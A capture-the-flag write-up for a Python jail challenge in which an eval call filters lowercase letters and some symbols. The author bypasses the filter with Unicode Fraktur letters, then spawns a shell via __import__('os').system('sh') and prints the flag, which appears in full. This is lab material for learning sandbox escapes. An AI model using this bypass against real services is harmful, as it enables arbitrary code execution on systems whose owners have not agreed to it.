# 『Baby Pyjail』
> baby pyjail

> Start challenge from: https://ctfify.1pc.tf/challenge/misc_baby_pyjail

> [Zip File](https://tcp.1pc.tf/assets/c728938331c5495b03d78d3cf9cd71f039ff8fbe5812f2b96cc55ed91062e459/babypyjail_babypyjail-dist.zip)

Author: daffainfo

# 『Code Chall』
```
inp = input("Input pls")

if any(c in inp for c in "abcdefghijklmnopqrstuvwxyz0123456789_\"'."):
    print("Invalid input!")
else:
    print(eval(inp))
```

# 『Solve』

We're given this code chall. There are blacklist that we can't use like `_`, `'`, and `.`. Also, We can't use normal character (i mean lowercase ) to do some execute. So how to solve it? well simple.

I use [this](https://github.com/daffainfo/ctf-writeup/tree/main/2023/h4ckc0n%202023/yet%20another%20pyjail) payload to bypass the blacklist. It use `gothic font` to execute the code.

The payload: `𝔢𝔵𝔢𝔠(𝔦𝔫𝔭𝔲𝔱())`. then `__import__("os").system("sh")` and lastly `cat flag.txt`. here's the flag:

<img width="668" height="153" alt="image" src="https://github.com/user-attachments/assets/d797c058-4406-45c0-86c9-16cb772df3b8" />

# 『Explanation』

```
Flag: RAMADAN{well_ada_banyak_cara_buat_ngesolve_ni_soal}
```
